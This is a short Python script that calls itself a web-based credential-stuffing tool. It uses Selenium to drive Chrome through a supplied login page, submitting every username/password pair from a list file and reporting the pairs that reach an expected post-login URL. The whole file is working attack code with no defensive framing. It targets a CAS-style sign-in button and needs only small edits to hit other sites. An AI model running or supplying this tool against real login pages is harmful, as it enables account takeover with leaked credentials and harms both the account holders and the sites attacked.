# web based cred stuffing using selenium.
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import argparse
import time

def send_req(username, password, url):
    driver = webdriver.Chrome()
    driver.get(url) # open website
    username_field = driver.find_element(By.NAME, "username") # replace "username" 
    password_field = driver.find_element(By.NAME, "password") # replace "password"
    username_field.send_keys(username)
    password_field.send_keys(password)
    login_button = driver.find_element(By.CLASS_NAME, "cas-login-sign-in-button") # replace "submit"
    login_button.click()
    time.sleep(5) # need to play around with this. Depends on how long login takes in the website.
    ans = driver.current_url
    driver.quit()
    return ans
    


def convert_file_to_list(file):
    with open(file, 'r') as f:
        lines = []
        for raw in f:
            word = raw.strip()
            lines.append(word.split())
    return lines

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'Take Host, list and expected url after login')
    parser.add_argument('-i', '--host', help = 'Host login url', required = True)
    parser.add_argument('-l', '--list', help= 'Username and password list seperated by space', required = True)
    parser.add_argument('-o', '--output', help='Post login expected url', required = True)
    args = parser.parse_args()
    host = args.host
    path = args.list
    output_domain = args.output

    credentials = convert_file_to_list(path)

    for username, password in credentials:
        output = send_req(username, password, host)
        if output == output_domain:
            print('THESE CREDENTIALS WORK!', username, password)
    

    

